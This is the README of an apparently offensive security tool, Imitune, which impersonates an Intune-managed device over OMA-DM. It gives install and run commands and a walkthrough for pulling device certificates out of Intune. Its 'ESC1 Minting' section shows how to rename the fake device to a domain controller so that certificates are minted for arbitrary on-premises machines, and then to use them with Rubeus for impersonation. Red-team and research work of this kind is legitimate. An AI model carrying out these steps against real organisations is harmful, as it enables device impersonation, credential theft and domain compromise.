# Imitune
An OMA-DM client and set of helper tools to impersonate an MDM managed device

## Background
This tool works best when you already have a working knowledge of the environment and can provide as much detail about the environment as possible

## Installation
You can install via pip. I suggest using virutal environments
```
mkdir imitune-ops
cd imitune-ops
python -m venv venv
```
On windows
```
venv\scripts\activate.bat
```
On Linix
```
source venv/bin/activate
```
Then, install imitune
```
pip install imitune
```

## Usage
1. Obtain an MDM certificate for an Intune management device
See our blog post here on how to accomplish this step:
https://specterops.io/blog/2025/07/30/entra-connect-attacker-tradecraft-part-3/
2. Copy the managementTree.json.template to managementTree.json. This represents all of your device settings and you should closely examine and modify the properties to your use case. Of note:
DNSComputerName is the display name that will be presented in the Intune admin panel
```
"./DevDetail/Ext/Microsoft/DNSComputerName": "DEVICES BY HOTNOPS", 
```
DeviceName is the value that will be used to populate the {{fullyQualifiedDomainName}} and {{deviceName}} properties
```
"./DevDetail/Ext/Microsoft/DeviceName": "DC02",
```
The ./Vendor/MSFT/NodeCache/MS%20DM%20Server/CacheVersion is very important. Modifying this field will trigger a re-sync of all cached properties in Intune.

3. Run an init commanad
```
python -m imitune 
--device-name DEVICE_NAME // This is only used for the source field of the OMA-DM message. Values in the managementTree.json file will be used for all management tree values
--pfx-file-path PFX_FILE_PATH // Path to the MDM certificate
--pfx-password // Password to the PFX file in the previous argument
--dummy-path // for testing, takes in a series of XML requests and respones from SyncMLViewer
--user-prompt // prompt the user before each request is sent
--output-directory // Output directory for loot and trace files. Uses --device-name if not provided
--user-jwt // Pass in a user JWT with management.microsoft.com aud to imitate a user logged into the device. This will help obtain configuration profiles scoped to individual users
```

Example:
```
python -m imitune --device-name TEST --pfx-file-path .\mdm-certificate.pfx --pfx-password il0veC3rts$ --action init


██╗███╗   ███╗██╗████████╗██╗   ██╗███╗   ██╗███████╗
██║████╗ ████║██║╚══██╔══╝██║   ██║████╗  ██║██╔════╝
██║██╔████╔██║██║   ██║   ██║   ██║██╔██╗ ██║█████╗
██║██║╚██╔╝██║██║   ██║   ██║   ██║██║╚██╗██║██╔══╝
██║██║ ╚═╝ ██║██║   ██║   ╚██████╔╝██║ ╚████║███████╗
╚═╝╚═╝     ╚═╝╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝
              [ I M I T U N E ]

[*] loading existing data from managementTree.json
[*] got a request for ./Device/Vendor/MSFT/ClientCertificateInstall/PFXCertInstall/5E9C6770-6D2E-4602-8ACA-B3418B1182BE/Status. sending 0
```

This tells is a desired response and tells us that Intune is asking about a particular certificate, and Imitune replied with an empty data response. This will trigger intune to send us a new ceritificate the next time we check in. If you modified the ./DevDetail/Ext/Microsoft/DeviceName parameter, wait for five minutes so that the request can be sent to the Intune Certificate Connector and returned. Once enough time has passed, re-run the command:

```
python -m imitune --device-name TEST --pfx-file-path .\mdm-certificate.pfx --pfx-password il0veC3rts$ --action init

██╗███╗   ███╗██╗████████╗██╗   ██╗███╗   ██╗███████╗
██║████╗ ████║██║╚══██╔══╝██║   ██║████╗  ██║██╔════╝
██║██╔████╔██║██║   ██║   ██║   ██║██╔██╗ ██║█████╗
██║██║╚██╔╝██║██║   ██║   ██║   ██║██║╚██╗██║██╔══╝
██║██║ ╚═╝ ██║██║   ██║   ╚██████╔╝██║ ╚████║███████╗
╚═╝╚═╝     ╚═╝╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝╚══════╝
              [ I M I T U N E ]

[*] loading existing data from managementTree.json
[*] obtained credentials at ./Device/Vendor/MSFT/ClientCertificateInstall/PFXCertInstall/5E9C6770-6D2E-4602-8ACA-B3418B1182BE/PFXCertBlob. extracting
```

And you'll see that we have a PFX file saved in our output directory. You can use this PFX file with Rubeus to impersonate the device on-premises.

## ESC1 Minting
If a property in the managementTree is used to populate the subject or SAN of a certificate, we can mint certificates for any on premises device we want. To do so, we'll need to modify our managementTree.json and set the CacheVersion to 0
```
"./Vendor/MSFT/NodeCache/MS%20DM%20Server/CacheVersion": "0",
```
Also, remove any line that starts with
```
./Device/Vendor/MSFT/ClientCertificateInstall/PFXCertInstall
```
We remove these so that when Intue asks about them, we respond with a 404 and indicate that they need to be sent back down. Lastly, we need to rename our device to the target of our ESC1 attack:
```
"./DevDetail/Ext/Microsoft/DeviceName": "DOMAINCONTROLLER",
```
Once our managementTree.json is ready, we will initiate our sync with the invalid CacheVersion. Intune will proceed to send down the entire node cache and inquire about the certs that need to be installed.
```
python -m imitune --device-name TEST --pfx-file-path .\mdm-certificate.pfx --pfx-password il0veC3rts$ --action init
```
It will take up to five minutes for the CSR request to be sent to the ADCS server and returned. After waiting, re-run the command (without modifying the managementTree.json!) and the certificate should be returned.

## Troubleshooting
* Trace files
Imitune saves all requests and responses in the $outputDir\traces folder. You can use these to determine what Intune is asking for and tweak any values in the managementTree.json file.
* Intune is resonding to my first request with an empty response
You don goofed. This happened to me so so many times when developing this. Figure out what you sent that broke Intune, wait 30 minutes, and try again.